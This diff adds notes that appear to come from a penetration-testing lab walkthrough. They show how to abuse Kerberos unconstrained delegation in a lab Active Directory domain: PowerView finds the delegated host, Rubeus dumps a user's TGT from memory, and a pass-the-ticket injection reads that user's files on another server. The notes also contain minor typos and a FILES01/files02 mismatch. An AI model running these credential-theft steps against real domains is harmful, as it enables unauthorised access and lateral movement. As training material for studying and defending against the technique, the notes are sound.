@@ -1,0 +1,46 @@
+# Domain Controller (DC) stores the information about computers and users configured with unconstrained delegation and makes this information available for all authenticated users.
+
+# The information is stored in the userAccountControl3 as TRUSTED_FOR_DELEGATION, which is represented with a numerical value of 524288.
+
+# From the Windows 11 machine named CLIENT01, we'll log in as the adam user who has local administrative access. In this case, we will use PowerView, which is located in the C:\Tools folder.
+
+    PS C:\Tools> Get-DomainComputer -Unconstrained
+          useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+          name                          : FILES01
+          dnshostname                   : FILES01.corp.com
+
+    FILES01 will be our target.
+
+# We'll launch Rubeus from within the C:\Tools directory on FILES01 using an administrative PowerShell prompt.
+      PS C:\Tools> .\Rubeus.exe dump /nowrap
+
+      (We find TGTs and TGSs related to the adam user along with the computer account, but no other domain users.)
+
+# We will check shares on the server 
+      PS C:\> net share
+            shares       C:\shares
+            The command completed successfully.
+      (By inspecting the shares further, we find an engineering share in the C:\shares folder. Let's inspect the permissions using icacls)
+      PS C:\Tools> icacls C:\shares\engineering
+                  C:\shares\engineering CORP\Administrator:(OI)(CI)(F)
+                        BUILTIN\Administrators:(OI)(CI)(F)
+                        CORP\Engineering:(OI)(CI)(M)
+                        NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+      (There is interestig share names CORP\Engineering)  we'll simulate this by logging in to the CLIENT02 machine with the james user.
+      Upon logging in, we'll find that the Engineering Share is automatically mapped and because of this, the TGT for james should be stored in memory on FILES01.
+
+      Let's rerun our Rubeus command.
+
+      PS C:\Tools> .\Rubeus.exe dump /nowrap
+             UserName                 : james
+             ServiceName              :  krbtgt/CORP.COM
+             UserName                 :  james
+             ticket
+
+      We'll go ahead and inject the ticket into our session using Rubeus with the ptt command along with the ticket we obtained.
+      PS C:\Tools> .\Rubeus.exe ptt /ticket:doIFhDCCBYCgAwIBBaEDAgEW...
+      
+      We should be able to list the contents of the folder.
+      PS C:\Tools> dir \\files02\home$\james
+
+      (After injecting the ticket, we are able to read the home folder for james, which is stored on a different server.)
